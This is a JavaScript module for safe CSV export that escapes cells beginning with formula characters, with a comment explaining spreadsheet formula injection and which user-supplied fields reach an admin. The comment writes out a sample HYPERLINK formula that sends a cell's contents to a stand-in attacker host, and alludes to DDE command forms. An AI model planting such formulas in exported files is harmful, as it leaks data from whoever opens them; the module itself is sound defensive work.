// CSV writing that a spreadsheet cannot be talked into executing.
//
// Quoting a field correctly (wrap in ", double the inner ") makes it valid
// CSV. It does NOT make it inert: Excel, LibreOffice and Google Sheets read a
// cell whose text begins with = + - @ (or a tab / carriage return) as a
// FORMULA, quoted or not. So a cell reading
//
//     =HYPERLINK("https://evil.example/?d="&A1,"Click")
//
// is a live link that exfiltrates the neighbouring cell the moment the file is
// opened, and the older =cmd| DDE forms can do considerably worse.
//
// This matters here because every field we export is user-supplied and at
// least one path is public:
//
//   • alt text          — model output derived from a user's uploaded image
//   • feedback subject / message / email / adminNotes
//                       — /api/support takes these UNAUTHENTICATED, and the
//                         file is opened by an admin. That is the sharp one:
//                         the attacker chooses the payload and someone with
//                         elevated access opens it.
//   • display name, company, location
//                       — profile fields the user controls
//
// The neutraliser is a leading apostrophe, which every major spreadsheet reads
// as "the rest of this cell is literal text" and does not display.
//
// Plain numbers are deliberately exempt. `-5` is a legitimate negative value
// and prefixing it would corrupt real data to defend against nothing — a bare
// number cannot begin a formula. `-5+cmd|…` is not a plain number and is
// still neutralised.

const FORMULA_LEAD = /^[=+\-@\t\r]/
const PLAIN_NUMBER = /^-?\d+(?:\.\d+)?$/

export function csvCell(value) {
  const text = value == null ? '' : String(value)
  const safe = FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text) ? `'${text}` : text
  return `"${safe.replace(/"/g, '""')}"`
}

// Build a whole document. `columns` are written as the header row verbatim —
// they are ours, not user input — and every body cell goes through csvCell.
export function toCsv(columns, rows, cell = (row, column) => row[column]) {
  return [
    columns.join(','),
    ...rows.map(row => columns.map(column => csvCell(cell(row, column))).join(',')),
  ].join('\n')
}
